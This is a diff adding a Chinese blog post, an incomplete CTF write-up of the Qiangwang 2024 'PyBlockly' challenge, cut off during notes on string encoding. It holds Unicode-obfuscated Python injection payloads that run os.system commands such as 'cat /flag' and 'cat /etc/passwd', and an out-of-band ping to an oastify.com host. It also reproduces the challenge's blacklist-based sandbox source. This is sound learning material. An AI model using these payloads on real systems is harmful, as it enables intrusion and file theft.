@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="截至24&#x2F;11&#x2F;3 21:25 还是没有尝试出来，等以后有正规题解再来，这里先不看了，先看看提权吧这道题感觉初见还是蛮有东西的，对我这个菜鸡是一道很值得学习的题目    培养一点重要的思想1.思维是肯定是找注入点，比如这里的2.多多本地试试，输入没有想要的效果一定要检查，强推本地跑一下3.涉及编码推荐适用python进行尝试，可以显示(bp这里不行)还可以用编码表示  分析与">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PyBlockly_强网24">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="截至24&#x2F;11&#x2F;3 21:25 还是没有尝试出来，等以后有正规题解再来，这里先不看了，先看看提权吧这道题感觉初见还是蛮有东西的，对我这个菜鸡是一道很值得学习的题目    培养一点重要的思想1.思维是肯定是找注入点，比如这里的2.多多本地试试，输入没有想要的效果一定要检查，强推本地跑一下3.涉及编码推荐适用python进行尝试，可以显示(bp这里不行)还可以用编码表示  分析与">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/PyBlockly_%E5%BC%BA%E7%BD%9124/len%E5%8F%91%E6%8C%A5%E4%BA%86%E4%BD%9C%E7%94%A8.png">
+<meta property="article:published_time" content="2024-11-02T03:30:09.970Z">
+<meta property="article:modified_time" content="2024-11-04T01:11:10.703Z">
+<meta property="article:tag" content="recurrence">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="root">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/PyBlockly_%E5%BC%BA%E7%BD%9124/len%E5%8F%91%E6%8C%A5%E4%BA%86%E4%BD%9C%E7%94%A8.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PyBlockly_强网24</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/02/pp2rce/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/02/Playground_%E5%BC%BA%E7%BD%9124/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&text=PyBlockly_强网24"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&is_video=false&description=PyBlockly_强网24"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PyBlockly_强网24&body=Check out this article: https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&title=PyBlockly_强网24"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&name=PyBlockly_强网24&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/&t=PyBlockly_强网24"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%8E%E5%B0%9D%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">分析与尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E4%B8%9C%E8%A5%BF"><span class="toc-number">3.</span> <span class="toc-text">新东西</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">3.1.</span> <span class="toc-text">*关于字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%82%B91-unidecode-unidecode"><span class="toc-number">3.2.</span> <span class="toc-text">绕过点1: unidecode.unidecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%82%B92-ast-Import%E5%92%8Cast-ImportFrom"><span class="toc-number">3.3.</span> <span class="toc-text">绕过点2: ast.Import和ast.ImportFrom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%82%B93-suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.4.</span> <span class="toc-text">绕过点3: suid提权</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PyBlockly_强网24
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-02T03:30:09.970Z" class="dt-published" itemprop="datePublished">2024-11-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/python/" rel="tag">python</a>, <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>, <a class="p-category" href="/tags/root/" rel="tag">root</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>截至24&#x2F;11&#x2F;3 21:25 还是没有尝试出来，等以后有正规题解再来，这里先不看了，先看看提权吧<br>这道题感觉初见还是蛮有东西的，对我这个菜鸡是一道很值得学习的题目</p>
+</blockquote>
+<hr>
+<blockquote>
+<p><em><strong>培养一点重要的思想</strong></em><br>1.思维是肯定是找注入点，比如这里的<br>2.多多本地试试，输入没有想要的效果一定要检查，<strong>强推本地跑一下</strong><br>3.涉及编码推荐适用python进行尝试，可以显示(bp这里不行)还可以用编码表示</p>
+</blockquote>
+<h2 id="分析与尝试"><a href="#分析与尝试" class="headerlink" title="分析与尝试"></a>分析与尝试</h2><ol>
+<li><p>unicode绕过，呜呜呜，只构造出来poc，可以实现代码执行，进一步可以绕过</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＇﹔<span class="built_in">print</span>⁽＇hello＇⁾﹔＇</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重写len()函数，读取文件，到这一步就卡住了 –&gt; <em><strong>编码的还是要在本地尝试一下</strong></em>，这里出现了转换后消失的情况，可以一个一个试</p>
+<ol>
+<li>WTF? –&gt; <em><strong>真相大白了，这里没有导入os模块调用不了啊，记错了wc，怪怪的可能是逻辑理解错了</strong></em><img src="/pic/PyBlockly_%E5%BC%BA%E7%BD%9124/len%E5%8F%91%E6%8C%A5%E4%BA%86%E4%BD%9C%E7%94%A8.png" alt="不懂为什么没有回显，蒙蔽了这是，绕过应该是成功"></li>
+</ol>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标 &#x27;+len=lambda x:0;os.system(&#x27;cat /flag&#x27;) +&#x27;</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line"><span class="comment"># 居然不能执行，本地看一下，是有些字符消失了</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇cat ／etc／passwd＇⁾⁾﹔＇</span><br><span class="line"><span class="comment"># 带外尝试，无反应，可能不出网</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇ping ﹣c <span class="number">4</span> x425n3uqpcd5ljq0c4809gjsijoac10q․oastify․com＇⁾⁾﹔＇</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终构造还是没有成功，但是每一个字符都有试成功哩</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔os․system⁽＇ls －la ／proc＇⁾﹔＇</span><br><span class="line">    <span class="comment"># len没有绕过成功？不是哥们，回显也是true哩</span></span><br><span class="line">    ＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽<span class="built_in">len</span>⁽＇a＇⁾⁼⁼<span class="number">0</span>⁾﹔＇</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><h3 id="关于字符串"><a href="#关于字符串" class="headerlink" title="*关于字符串"></a>*关于字符串</h3><ol>
+<li><em><strong>加深了我对字符串编码的理解</strong></em><ol>
+<li>你在本地<strong>通过python</strong>发出去的\n和\r还有\u编码这些都会直接解释为对应的字符，在发出去的字符串中根本不会有\这个字符，不需要进行绕过</li>
+<li>但是如果<strong>是在bp</strong>中的话，那么对方接受到的就是有带\的</li>
+<li><strong>最大大的区别在于</strong>: 是否在发出去时有进行替换，记住的是python有</li>
